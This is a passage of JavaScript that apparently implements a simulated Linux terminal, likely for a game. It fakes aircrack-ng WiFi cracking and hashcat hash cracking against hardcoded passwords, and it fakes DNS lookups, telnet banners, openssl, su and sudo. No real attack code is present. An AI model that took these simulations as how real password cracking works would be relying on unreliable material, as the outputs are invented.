                // Update the same div in place
                output.textContent = outputText;

                await new Promise(resolve => setTimeout(resolve, 1000));
                cycle++;
            }
        }
    },

    'aircrack-ng': {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length < 2) {
                return 'Aircrack-ng 1.6\n\nUsage: aircrack-ng [options] <capture file>\n\nOptions:\n    -w <wordlist>  : Path to wordlist file\n    -b <bssid>     : Target access point BSSID\n    -e <essid>     : Target access point ESSID';
            }

            // Parse arguments
            let wordlistFile = null;
            let captureFile = null;
            let bssid = null;
            let essid = null;

            for (let i = 1; i < args.length; i++) {
                if (args[i] === '-w' && i + 1 < args.length) {
                    wordlistFile = args[i + 1];
                    i++;
                } else if (args[i] === '-b' && i + 1 < args.length) {
                    bssid = args[i + 1];
                    i++;
                } else if (args[i] === '-e' && i + 1 < args.length) {
                    essid = args[i + 1];
                    i++;
                } else if (!args[i].startsWith('-')) {
                    captureFile = args[i];
                }
            }

            if (!captureFile) {
                return 'aircrack-ng: No capture file specified';
            }

            if (!wordlistFile) {
                return 'aircrack-ng: No wordlist specified. Use -w <wordlist>';
            }

            // Read capture file
            const captureContent = readFile(captureFile, environment.CWD);
            if (captureContent === false) {
                return `aircrack-ng: ${captureFile}: No such file or directory`;
            }

            // Read wordlist
            const wordlistContent = readFile(wordlistFile, environment.CWD);
            if (wordlistContent === false) {
                return `aircrack-ng: ${wordlistFile}: No such file or directory`;
            }

            const wordlist = wordlistContent.split('\n').filter(w => w.trim().length > 0);
            if (wordlist.length === 0) {
                return 'aircrack-ng: Wordlist is empty';
            }

            // Extract network info from capture file
            const bssidMatch = captureContent.match(/([0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2})/i);
            const essidMatch = captureContent.match(/for ([^\(]+)/);

            const targetBssid = bssid || (bssidMatch ? bssidMatch[1] : 'AA:BB:CC:DD:EE:FF');
            const targetEssid = essid || (essidMatch ? essidMatch[1].trim() : 'Unknown');

            // Show header
            const output = document.createElement('div');
            output.className = 'tk-terminal-output';
            output.textContent = `Aircrack-ng 1.6\n\nReading packets from ${captureFile}...\nOpening ${captureFile}\nRead 1234 packets.\n\n   #  BSSID              ESSID                     Encryption\n\n   1  ${targetBssid}  ${targetEssid.padEnd(25)} WPA (1 handshake)\n\nIndex number of target network ? `;
            ctx.terminalInnerContent.appendChild(output);
            ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;

            await new Promise(resolve => setTimeout(resolve, 1000));

            const targetOutput = document.createElement('div');
            targetOutput.className = 'tk-terminal-output';
            targetOutput.textContent = `1\n\nTarget selected: ${targetBssid} (${targetEssid})\n\nAttacking ${targetBssid} with wordlist ${wordlistFile}\n`;
            ctx.terminalInnerContent.appendChild(targetOutput);
            ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;

            // Simulated WiFi passwords for known networks
            const wifiPasswords = {
                '00:14:6C:7E:40:80': 'securenet123',
                'A4:08:F5:2D:39:E1': 'password123',
                'C8:3A:35:B0:24:68': 'coffeeshop',
                'F4:EC:38:D1:5A:7C': 'guestwifi'
            };

            // Try to crack
            let found = false;
            let tried = 0;

            for (const word of wordlist) {
                tried++;

                if (window.isCommandInterrupted) {
                    const interruptOutput = document.createElement('div');
                    interruptOutput.className = 'tk-terminal-output';
                    interruptOutput.textContent = '\nAborted';
                    ctx.terminalInnerContent.appendChild(interruptOutput);
                    ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;
                    return null;
                }

                // Check if password matches
                if (wifiPasswords[targetBssid] === word) {
                    await new Promise(resolve => setTimeout(resolve, 100));

                    const successOutput = document.createElement('div');
                    successOutput.className = 'tk-terminal-output';
                    successOutput.textContent = `\nKEY FOUND! [ ${word} ]\n\nMaster Key     : A1 B2 C3 D4 E5 F6 G7 H8 I9 J0 K1 L2 M3 N4 O5 P6\nTransient Key  : Q7 R8 S9 T0 U1 V2 W3 X4 Y5 Z6 A7 B8 C9 D0 E1 F2\nEAPOL HMAC     : G3 H4 I5 J6 K7 L8 M9 N0 O1 P2 Q3 R4 S5 T6 U7 V8\n\nDecrypted correctly: 100%`;
                    ctx.terminalInnerContent.appendChild(successOutput);
                    ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;
                    found = true;
                    break;
                }

                // Update progress every 50 words
                if (tried % 50 === 0) {
                    const progressOutput = document.createElement('div');
                    progressOutput.className = 'tk-terminal-output';
                    progressOutput.textContent = `\rTested ${tried}/${wordlist.length} keys... (${Math.floor(tried/wordlist.length*100)}%)`;
                    ctx.terminalInnerContent.appendChild(progressOutput);
                    ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;
                    await new Promise(resolve => setTimeout(resolve, 10));
                }
            }

            if (!found) {
                const failOutput = document.createElement('div');
                failOutput.className = 'tk-terminal-output';
                failOutput.textContent = `\n\nKEY NOT FOUND\n\nTested ${tried} keys. The password is not in your wordlist.`;
                ctx.terminalInnerContent.appendChild(failOutput);
                ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;
            }

            return null;
        }
    },

    hashcat: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length < 2) {
                return 'hashcat (v6.2.5) starting in help mode\n\nUsage: hashcat [options]... hash|hashfile [dictionary|mask|directory]...\n\n- [ Outfile Formats ] -\n\n  # | Format\n ===+========\n  1 | hash[:salt]\n  2 | plain\n  3 | hex_plain\n\nTry --help for more information.';
            }

            const hashFile = args[1];
            const content = readFile(hashFile, environment.CWD);

            if (content === false) {
                return `hashcat: ${hashFile}: No such file or directory`;
            }

            // Simulate hashcat session
            const output = document.createElement('div');
            output.className = 'tk-terminal-output';
            output.textContent = `hashcat (v6.2.5) starting...\n\nOpenCL API (OpenCL 2.0) - Platform #1 [Intel]\n==============================================\n* Device #1: Intel HD Graphics, 1536/1536 MB (384 MB allocatable), 24MCU\n\nMinimum password length supported by kernel: 0\nMaximum password length supported by kernel: 256\n\nHashes: ${content.split('\n').length} digests; ${content.split('\n').length} unique digests, ${content.split('\n').length} unique salts\nBitmaps: 16 bits, 65536 entries, 0x0000ffff mask\n\nDictionary cache hit:\n* Filename..: rockyou.txt\n* Passwords.: 14344385\n* Bytes.....: 139921507\n* Keyspace..: 14344385`;
            ctx.terminalInnerContent.appendChild(output);
            ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;

            // Simulate cracking progress
            await new Promise(resolve => setTimeout(resolve, 500));

            const progressOutput = document.createElement('div');
            progressOutput.className = 'tk-terminal-output';
            progressOutput.textContent = '\nCracking...';
            ctx.terminalInnerContent.appendChild(progressOutput);

            const commonPasswords = ['password', 'letmein', 'admin', '123456', 'qwerty'];
            const lines = content.split('\n').filter(l => l.trim());

            for (let i = 0; i < Math.min(lines.length, 3); i++) {
                // Check for interruption
                if (window.isCommandInterrupted) {
                    const interruptOutput = document.createElement('div');
                    interruptOutput.className = 'tk-terminal-output';
                    interruptOutput.textContent = '\n\nSession aborted';
                    ctx.terminalInnerContent.appendChild(interruptOutput);
                    ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;
                    return null;
                }

                await new Promise(resolve => setTimeout(resolve, 400));
                const crackedOutput = document.createElement('div');
                crackedOutput.className = 'tk-terminal-output';
                crackedOutput.textContent = `${lines[i].split(':')[0]}:${commonPasswords[i % commonPasswords.length]}`;
                ctx.terminalInnerContent.appendChild(crackedOutput);
                ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;
            }

            const finalOutput = document.createElement('div');
            finalOutput.className = 'tk-terminal-output';
            finalOutput.textContent = `\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))\nTime.Started.....: ${new Date().toISOString().substring(0, 19)}\nTime.Estimated...: ${new Date().toISOString().substring(0, 19)}\nGuess.Base.......: File (rockyou.txt)\nSpeed.#1.........:     1024 H/s (8.45ms)\nRecovered........: ${Math.min(lines.length, 3)}/${lines.length} (${Math.floor(Math.min(lines.length, 3) / lines.length * 100)}%) Digests\nProgress.........: 14344385/14344385 (100.00%)\nRejected.........: 0/14344385 (0.00%)\n\nStarted: ${new Date().toISOString().substring(0, 19)}\nStopped: ${new Date().toISOString().substring(0, 19)}`;
            ctx.terminalInnerContent.appendChild(finalOutput);
            ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;

            return null;
        }
    },

    dig: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length < 2) {
                return 'Usage: dig [@server] domain [query-type]';
            }

            const domain = args[1];
            const queryType = args.length > 2 ? args[2].toUpperCase() : 'A';

            // Check DNS cache or generate IP
            let ip = dnsCache[domain];
            if (!ip) {
                const hash = hashString(domain);
                const octet1 = ((hash & 0xFF000000) >>> 24) % 223 + 1; // 1-223
                const octet2 = ((hash & 0x00FF0000) >>> 16) % 256;
                const octet3 = ((hash & 0x0000FF00) >>> 8) % 256;
                const octet4 = (hash & 0x000000FF) % 256;
                ip = `${octet1}.${octet2}.${octet3}.${octet4}`;
                dnsCache[domain] = ip;
            }

            const timestamp = new Date().toUTCString();
            let answerSection = '';

            if (queryType === 'A') {
                answerSection = `${domain}.\t\t3600\tIN\tA\t${ip}`;
            } else if (queryType === 'AAAA') {
                const hash = hashString(domain + 'v6');
                const hex1 = ((hash >>> 24) & 0xFFFF).toString(16);
                const hex2 = ((hash >>> 16) & 0xFFFF).toString(16);
                const hex3 = ((hash >>> 8) & 0xFFFF).toString(16);
                const hex4 = (hash & 0xFFFF).toString(16);
                const ipv6 = `2001:db8:${hex1}:${hex2}:${hex3}:${hex4}::1`;
                answerSection = `${domain}.\t\t3600\tIN\tAAAA\t${ipv6}`;
            } else if (queryType === 'MX') {
                answerSection = `${domain}.\t\t3600\tIN\tMX\t10 mail.${domain}.\n${domain}.\t\t3600\tIN\tMX\t20 mail2.${domain}.`;
            } else if (queryType === 'NS') {
                answerSection = `${domain}.\t\t3600\tIN\tNS\tns1.${domain}.\n${domain}.\t\t3600\tIN\tNS\tns2.${domain}.`;
            } else if (queryType === 'TXT') {
                answerSection = `${domain}.\t\t3600\tIN\tTXT\t"v=spf1 mx a ip4:${ip} ~all"`;
            } else if (queryType === 'SOA') {
                answerSection = `${domain}.\t\t3600\tIN\tSOA\tns1.${domain}. admin.${domain}. 2023010101 7200 3600 1209600 3600`;
            } else {
                return `dig: unknown query type: ${queryType}`;
            }

            return `
; <<>> DiG 9.18.1-1 <<>> ${domain} ${queryType}
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: ${Math.floor(Math.random() * 65535)}
;; flags: qr rd ra; QUERY: 1, ANSWER: ${answerSection.split('\n').length}, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;${domain}.\t\t\tIN\t${queryType}

;; ANSWER SECTION:
${answerSection}

;; Query time: ${Math.floor(Math.random() * 50) + 10} msec
;; SERVER: 8.8.8.8#53(8.8.8.8)
;; WHEN: ${timestamp}
;; MSG SIZE  rcvd: ${100 + Math.floor(Math.random() * 100)}
`;
        }
    },

    host: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length < 2) {
                return 'Usage: host [-t type] hostname [server]';
            }

            let domain = args[1];
            let queryType = 'A';

            // Check for -t flag
            if (args[1] === '-t' && args.length > 3) {
                queryType = args[2].toUpperCase();
                domain = args[3];
            }

            // Check DNS cache or generate IP
            let ip = dnsCache[domain];
            if (!ip) {
                const hash = hashString(domain);
                const octet1 = ((hash & 0xFF000000) >>> 24) % 223 + 1;
                const octet2 = ((hash & 0x00FF0000) >>> 16) % 256;
                const octet3 = ((hash & 0x0000FF00) >>> 8) % 256;
                const octet4 = (hash & 0x000000FF) % 256;
                ip = `${octet1}.${octet2}.${octet3}.${octet4}`;
                dnsCache[domain] = ip;
            }

            if (queryType === 'A') {
                return `${domain} has address ${ip}`;
            } else if (queryType === 'AAAA') {
                const hash = hashString(domain + 'v6');
                const hex1 = ((hash >>> 24) & 0xFFFF).toString(16);
                const hex2 = ((hash >>> 16) & 0xFFFF).toString(16);
                const hex3 = ((hash >>> 8) & 0xFFFF).toString(16);
                const hex4 = (hash & 0xFFFF).toString(16);
                const ipv6 = `2001:db8:${hex1}:${hex2}:${hex3}:${hex4}::1`;
                return `${domain} has IPv6 address ${ipv6}`;
            } else if (queryType === 'MX') {
                return `${domain} mail is handled by 10 mail.${domain}.\n${domain} mail is handled by 20 mail2.${domain}.`;
            } else if (queryType === 'NS') {
                return `${domain} name server ns1.${domain}.\n${domain} name server ns2.${domain}.`;
            } else if (queryType === 'TXT') {
                return `${domain} descriptive text "v=spf1 mx a ip4:${ip} ~all"`;
            } else {
                return `host: invalid type: ${queryType}`;
            }
        }
    },

    arp: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            // Show ARP table with cached DNS entries and some default entries
            let arpEntries = [
                { ip: '192.168.1.1', mac: 'a4:5e:60:e8:3c:12', type: 'C' },
                { ip: '192.168.1.254', mac: '00:0c:29:4f:5a:7b', type: 'C' }
            ];

            // Add entries from DNS cache
            const dnsEntries = Object.entries(dnsCache).slice(0, 5);
            for (const [hostname, ip] of dnsEntries) {
                // Generate consistent MAC address from IP
                const hash = hashString(ip);
                const mac1 = ((hash >>> 24) & 0xFF).toString(16).padStart(2, '0');
                const mac2 = ((hash >>> 16) & 0xFF).toString(16).padStart(2, '0');
                const mac3 = ((hash >>> 8) & 0xFF).toString(16).padStart(2, '0');
                const mac4 = (hash & 0xFF).toString(16).padStart(2, '0');
                const mac5 = ((hash >>> 12) & 0xFF).toString(16).padStart(2, '0');
                const mac6 = ((hash >>> 4) & 0xFF).toString(16).padStart(2, '0');
                const mac = `${mac1}:${mac2}:${mac3}:${mac4}:${mac5}:${mac6}`;
                arpEntries.push({ ip, mac, type: 'C' });
            }

            let output = 'Address                  HWtype  HWaddress           Flags Mask            Iface\n';
            for (const entry of arpEntries) {
                output += `${entry.ip.padEnd(24)} ether   ${entry.mac.padEnd(19)} ${entry.type}                     eth0\n`;
            }

            return output.trimEnd();
        }
    },

    telnet: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length < 2) {
                return 'Usage: telnet host [port]';
            }

            const hostname = args[1];
            const port = args.length > 2 ? parseInt(args[2]) : 23;

            // Check DNS cache or generate IP
            let ip = dnsCache[hostname];
            if (!ip) {
                const hash = hashString(hostname);
                const octet1 = ((hash & 0xFF000000) >>> 24) % 223 + 1;
                const octet2 = ((hash & 0x00FF0000) >>> 16) % 256;
                const octet3 = ((hash & 0x0000FF00) >>> 8) % 256;
                const octet4 = (hash & 0x000000FF) % 256;
                ip = `${octet1}.${octet2}.${octet3}.${octet4}`;
                dnsCache[hostname] = ip;
            }

            const output1 = document.createElement('div');
            output1.className = 'tk-terminal-output';
            output1.textContent = `Trying ${ip}...`;
            ctx.terminalInnerContent.appendChild(output1);
            ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;

            await new Promise(resolve => setTimeout(resolve, 500));

            // Common service banners
            const serviceBanners = {
                21: `Connected to ${hostname}.\nEscape character is '^]'.\n220 ${hostname} FTP server (Version 6.4) ready.`,
                22: `Connected to ${hostname}.\nEscape character is '^]'.\nSSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5`,
                23: `Connected to ${hostname}.\nEscape character is '^]'.\n\nUbuntu 20.04.3 LTS\n${hostname} login: `,
                25: `Connected to ${hostname}.\nEscape character is '^]'.\n220 ${hostname} ESMTP Postfix`,
                80: `Connected to ${hostname}.\nEscape character is '^]'.\nGET / HTTP/1.0\n\n`,
                110: `Connected to ${hostname}.\nEscape character is '^]'.\n+OK POP3 server ready`,
                143: `Connected to ${hostname}.\nEscape character is '^]'.\n* OK [CAPABILITY IMAP4rev1] IMAP server ready`,
                443: `Connected to ${hostname}.\nEscape character is '^]'.\n`,
                3306: `Connected to ${hostname}.\nEscape character is '^]'.\n[MySQL protocol handshake]`,
                5432: `Connected to ${hostname}.\nEscape character is '^]'.\n[PostgreSQL protocol]`
            };

            const banner = serviceBanners[port] || `Connected to ${hostname}.\nEscape character is '^]'.`;

            const output2 = document.createElement('div');
            output2.className = 'tk-terminal-output';
            output2.textContent = banner;
            ctx.terminalInnerContent.appendChild(output2);
            ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;

            // Wait for user to press a key to close connection
            const output3 = document.createElement('div');
            output3.className = 'tk-terminal-output';
            output3.textContent = '\nPress any key to close connection...';
            ctx.terminalInnerContent.appendChild(output3);
            ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;

            await ctx.waitKey();

            const output4 = document.createElement('div');
            output4.className = 'tk-terminal-output';
            output4.textContent = 'Connection closed by foreign host.';
            ctx.terminalInnerContent.appendChild(output4);
            ctx.terminalBody.scrollTop = ctx.terminalBody.scrollHeight;

            return null;
        }
    },

    openssl: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length < 2) {
                return `OpenSSL 3.0.2 15 Mar 2022 (Library: OpenSSL 3.0.2 15 Mar 2022)
Usage: openssl [command] [options]

Common commands:
  base64        Base64 encoding/decoding
  enc           Encryption/decryption
  dgst          Message digest calculation
  s_client      SSL/TLS client
  x509          Certificate display and signing
  rand          Generate random data
  passwd        Password hashing
  version       Show version information

Try 'openssl [command] -help' for command-specific options.`;
            }

            const subcommand = args[1];

            if (subcommand === 'version') {
                const flags = args.slice(2);
                if (flags.includes('-a')) {
                    return `OpenSSL 3.0.2 15 Mar 2022 (Library: OpenSSL 3.0.2 15 Mar 2022)
built on: Mon Mar 14 15:18:44 2022 UTC
platform: linux-x86_64
options:  bn(64,64) rc4(16x,int) des(int) idea(int) blowfish(ptr)
compiler: gcc -fPIC -pthread -m64 -Wa,--noexecstack
OPENSSLDIR: "/usr/lib/ssl"
ENGINESDIR: "/usr/lib/x86_64-linux-gnu/engines-3"
MODULESDIR: "/usr/lib/x86_64-linux-gnu/ossl-modules"
Seeding source: os-specific`;
                }
                return 'OpenSSL 3.0.2 15 Mar 2022 (Library: OpenSSL 3.0.2 15 Mar 2022)';
            }

            if (subcommand === 'rand') {
                const hexFlag = args.includes('-hex');
                const base64Flag = args.includes('-base64');
                let bytes = 16;

                // Find the byte count
                for (let i = 2; i < args.length; i++) {
                    if (!args[i].startsWith('-') && !isNaN(args[i])) {
                        bytes = parseInt(args[i]);
                        break;
                    }
                }

                // Generate random hex string
                let random = '';
                for (let i = 0; i < bytes; i++) {
                    random += Math.floor(Math.random() * 256).toString(16).padStart(2, '0');
                }

                if (base64Flag) {
                    // Convert hex to base64
                    const hexBytes = random.match(/.{2}/g).map(h => String.fromCharCode(parseInt(h, 16))).join('');
                    return btoa(hexBytes);
                }

                return random;
            }

            if (subcommand === 's_client') {
                // Find host and port
                let host = null;
                let port = 443;

                for (let i = 2; i < args.length; i++) {
                    if (args[i] === '-connect' && i + 1 < args.length) {
                        const parts = args[i + 1].split(':');
                        host = parts[0];
                        if (parts.length > 1) port = parseInt(parts[1]);
                    }
                }

                if (!host) {
                    return 'openssl s_client: -connect required';
                }

                // Check DNS cache or generate IP
                let ip = dnsCache[host];
                if (!ip) {
                    const hash = hashString(host);
                    const octet1 = ((hash & 0xFF000000) >>> 24) % 223 + 1;
                    const octet2 = ((hash & 0x00FF0000) >>> 16) % 256;
                    const octet3 = ((hash & 0x0000FF00) >>> 8) % 256;
                    const octet4 = (hash & 0x000000FF) % 256;
                    ip = `${octet1}.${octet2}.${octet3}.${octet4}`;
                    dnsCache[host] = ip;
                }

                const certInfo = `CONNECTED(00000003)
depth=2 C=US, O=Internet Security Research Group, CN=ISRG Root X1
verify return:1
depth=1 C=US, O=Let's Encrypt, CN=R3
verify return:1
depth=0 CN=${host}
verify return:1
---
Certificate chain
 0 s:CN=${host}
   i:C=US, O=Let's Encrypt, CN=R3
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIFJTCCBAWgAwIBAgISA${Math.random().toString(36).substring(2, 30).toUpperCase()}
AQEFAAOCAQ8AMIIBCgKCAQEA${Math.random().toString(36).substring(2, 30).toUpperCase()}
-----END CERTIFICATE-----
subject=CN=${host}
issuer=C=US, O=Let's Encrypt, CN=R3
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: RSA-PSS
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 3654 bytes and written 407 bytes
Verification: OK
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Server public key is 2048 bit
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 0 (ok)
---`;

                return certInfo;
            }

            if (subcommand === 'passwd') {
                const password = args.length > 2 ? args.slice(2).join(' ') : 'password';
                // Generate a simple crypt-style hash
                const hash = hashString(password);
                const salt = Math.random().toString(36).substring(2, 10);
                const hashStr = Math.abs(hash).toString(16).padStart(16, '0');
                return `$6$${salt}$${hashStr}`;
            }

            if (subcommand === 'base64') {
                // Handle base64 encoding/decoding
                const decodeFlag = args.includes('-d');
                let input = '';

                // Find input after flags
                for (let i = 2; i < args.length; i++) {
                    if (!args[i].startsWith('-')) {
                        input = args.slice(i).join(' ');
                        break;
                    }
                }

                if (decodeFlag) {
                    try {
                        return atob(input);
                    } catch (e) {
                        return 'openssl: invalid base64 input';
                    }
                } else {
                    return btoa(input);
                }
            }

            return `openssl: unknown command: ${subcommand}\nTry 'openssl help' for more information.`;
        }
    },

    bash: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            return '';
        }
    },

    which: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            if (args.length > 1) {
                const cmdToFind = args[1];
                const PATH = environment.PATH.split(':');
                let foundPath = null;
                for (const p of PATH) {
                    const potentialPath = `${p}/${cmdToFind}`;
                    const file = getFile(potentialPath);
                    if (file && file.type === 'file' && file.content === 'ELF executable') {
                        foundPath = potentialPath;
                        break;
                    }
                }
                if (foundPath) {
                    return foundPath;
                }
                return `which: no ${cmdToFind} in (${environment.PATH.split(':').join(':')})`;
            }
            return 'Usage: which <command>';
        }
    },

    su: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            let targetUser = 'root';

            // Parse arguments
            if (args.length > 1) {
                if (args[1] === '-' || args[1] === '-l') {
                    targetUser = 'root';
                } else {
                    targetUser = args[1];
                }
            }

            // Check if target user exists
            const userInfo = getUserInfo(targetUser);
            if (!userInfo) {
                return `su: user ${targetUser} does not exist`;
            }

            // If current user is root, allow switching without password
            if (environment.USER === 'root') {
                if (switchUser(targetUser)) {
                    // Update prompt and title after user switch
                    ctx.setNewCurrentDirectory(environment.CWD, environment.OLDPWD);
                    return '';
                }
                return `su: failed to switch to user ${targetUser}`;
            }

            // Non-root users need password - prompt for it
            const passwordPrompt = document.createElement('div');
            passwordPrompt.className = 'tk-terminal-output';
            passwordPrompt.textContent = 'Password: ';
            ctx.terminalInnerContent.appendChild(passwordPrompt);

            // Create password input
            const passwordInput = document.createElement('input');
            passwordInput.type = 'text';
            passwordInput.className = 'tk-terminal-input tk-password';
            passwordInput.autocomplete = 'off';
            passwordInput.setAttribute('data-form-type', 'other');
            passwordInput.setAttribute('data-lpignore', 'true');
            passwordInput.style.display = 'inline-block';
            passwordInput.style.width = 'auto';
            passwordPrompt.appendChild(passwordInput);
            passwordInput.focus();

            // Wait for password entry
            return new Promise((resolve) => {
                passwordInput.addEventListener('keydown', (e) => {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        const enteredPassword = passwordInput.value;
                        passwordInput.remove();

                        // Verify password
                        if (verifyPassword(targetUser, enteredPassword)) {
                            if (switchUser(targetUser)) {
                                ctx.setNewCurrentDirectory(environment.CWD, environment.OLDPWD);
                                resolve('');
                            } else {
                                resolve(`su: failed to switch to user ${targetUser}`);
                            }
                        } else {
                            resolve('su: Authentication failure');
                        }
                    } else if (e.key === 'c' && e.ctrlKey) {
                        // Ctrl+C cancels password prompt
                        e.preventDefault();
                        passwordInput.remove();
                        resolve('^C');
                    }
                });
            });
        }
    },

    sudo: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            // Check if user has sudo privileges
            if (!canUseSudo(environment.USER)) {
                return `${environment.USER} is not in the sudoers file. This incident will be reported.`;
            }

            // Need at least one argument (the command to run)
            if (args.length < 2) {
                return 'usage: sudo command';
            }

            // Parse sudo options first, then find the command
            let sudoArgs = args.slice(1);
            let commandIndex = 0;

            // Skip sudo-specific options to find the actual command
            // Only -u is a sudo option that takes an argument
            for (let i = 0; i < sudoArgs.length; i++) {
                if (sudoArgs[i] === '-u' && i + 1 < sudoArgs.length) {
                    // Skip -u and its argument
                    commandIndex = i + 2;
                    i++; // Skip the user argument
                } else if (sudoArgs[i].startsWith('-') && !sudoArgs[i].startsWith('--')) {
                    // Other sudo short options (skip them)
                    commandIndex = i + 1;
                } else {
                    // Found the command (not a sudo option)
                    commandIndex = i;
                    break;
                }
            }

            // Get command name and its arguments (including flags like --help)
            const commandName = sudoArgs[commandIndex];
            // Pass all arguments after the command name to the command
            sudoArgs = [commandName, ...sudoArgs.slice(commandIndex + 1)];

            // Special case: sudo su (switch to root permanently without password)
            if (commandName === 'su') {
                let targetUser = 'root';
                if (sudoArgs.length > 1) {
                    if (sudoArgs[1] === '-' || sudoArgs[1] === '-l') {
                        targetUser = 'root';
                    } else {
                        targetUser = sudoArgs[1];
                    }
                }

                const userInfo = getUserInfo(targetUser);
                if (!userInfo) {
                    return `su: user ${targetUser} does not exist`;
                }

                // Switch without password (sudo bypasses password check)
                // Push to stack so exit can return to previous user
                if (switchUser(targetUser, true)) {  // true = push to stack for exit
                    ctx.setNewCurrentDirectory(environment.CWD, environment.OLDPWD);
                    return '';
                }
                return `su: failed to switch to user ${targetUser}`;
            }

            // Save current user environment
            const originalUser = environment.USER;
            const originalUID = environment.UID;
            const originalGID = environment.GID;
            const originalHOME = environment.HOME;

            // Temporarily switch to root
            environment.USER = 'root';
            environment.UID = '0';
            environment.GID = '0';
            environment.HOME = '/home/root';

            let result = '';

            // Check if command exists in commands object
            if (commands[commandName]) {
                try {
                    result = await commands[commandName].execute(sudoArgs, ctx);
                } catch (error) {
                    result = `sudo: ${commandName}: command execution failed`;
                }
            } else {
                result = `sudo: ${commandName}: command not found`;
            }

            // Restore original user environment
            environment.USER = originalUser;
            environment.UID = originalUID;
            environment.GID = originalGID;
            environment.HOME = originalHOME;

            return result;
        }
    },

    exit: {
        isBuiltin: true,
        execute: async (args, ctx) => {
            // Check if we're in an SSH session
            if (window.sshOriginalEnvironment) {
                // Restore original /home directory contents
                const homeDir = getDirectory('/home');
                if (homeDir && window.sshOriginalEnvironment.homeContents) {
                    homeDir.contents = window.sshOriginalEnvironment.homeContents;
                }

                // Restore original /etc directory contents
                const etcDir = getDirectory('/etc');
                if (etcDir && window.sshOriginalEnvironment.etcContents) {
                    etcDir.contents = window.sshOriginalEnvironment.etcContents;
                }

                // Restore original environment
                environment.USER = window.sshOriginalEnvironment.USER;
                environment.HOME = window.sshOriginalEnvironment.HOME;
                environment.CWD = window.sshOriginalEnvironment.CWD;
                environment.HOSTNAME = window.sshOriginalEnvironment.HOSTNAME;

                // Restore original command history
                if (window.sshOriginalEnvironment.commandHistory) {
                    setCurrentHistory(window.sshOriginalEnvironment.commandHistory);
                }

                // Clear SSH session
                delete window.sshOriginalEnvironment;

                // Update the directory context
                ctx.setNewCurrentDirectory(environment.CWD, environment.OLDPWD);

                return 'logout\nConnection to remote host closed.';
            }

            // Not in SSH session, check for user stack (su/sudo su)
            const previousUser = exitUser();

            if (previousUser === null) {
                // No previous user - close the terminal
                const terminalWindow = ctx.terminalBody.closest('.window');
                if (terminalWindow) {
                    const closeBtn = terminalWindow.querySelector('.close-button');
                    if (closeBtn) {
                        closeBtn.click();
                    }
                }
                return null;
            }

            // Switched back to previous user
            ctx.setNewCurrentDirectory(environment.CWD, environment.OLDPWD);
            return '';
        }
    },

    useradd: {
        isBuiltin: false,
        execute: async (args, ctx) => {
            // Only root can add users
            if (environment.USER !== 'root') {
                return 'useradd: Permission denied (you must be root)';
            }

            if (args.length < 2) {
                return 'Usage: useradd <username>';
            }

            const username = args[1];

            // Check for valid username
            if (!/^[a-z_][a-z0-9_-]*$/.test(username)) {
                return `useradd: invalid username '${username}'`;
            }

            // Default password is the username
            const password = args.includes('-p') && args.length > args.indexOf('-p') + 1
                ? args[args.indexOf('-p') + 1]
                : username;

            const result = addUser(username, password);
            return result.message;
        }
    },

    // ============================================================================
    // EASTER EGG / FUN COMMANDS
    // ============================================================================

    sl: {
        isBuiltin: true,
        execute: async (args, ctx) => {
            const train = `
      ====        ________                ___________
  _D _|  |_______/        \\__I_I_____===__|_________|
   |(_)---  |   H\\________/ |   |        =|___ ___|
   /     |  |   H  |  |     |   |         ||_| |_||
  |      |  |   H  |__--------------------| [___] |
  | ________|___H__/__|_____/[][]~\\_______|       |
  |/ |   |-----------I_____I [][] []  D   |=======|_
__/ =| o |=-~~\\  /~~\\  /~~\\  /~~\\ ____Y___________|__
 |/-=|___|=    ||    ||    ||    |_____/~\\___/
  \\_/      \\O=====O=====O=====O_/      \\_/

                      CHOO CHOO!
`;
            return train;
        }
    },

    cmatrix: {
        isBuiltin: true,
        execute: async (args, ctx) => {
            // Generate Matrix-style falling characters
            const width = 60;
            const height = 20;
            const chars = 'ﾊﾐﾋｰｳｼﾅﾓﾆｻﾜﾂｵﾘｱﾎﾃﾏｹﾒｴｶｷﾑﾕﾗｾﾈｽﾀﾇﾍ012345789Z:."\\"=*+-<>¦╌çｸ';
            let output = '\n';

            for (let row = 0; row < height; row++) {
                let line = '';
                for (let col = 0; col < width; col++) {
                    if (Math.random() < 0.3) {
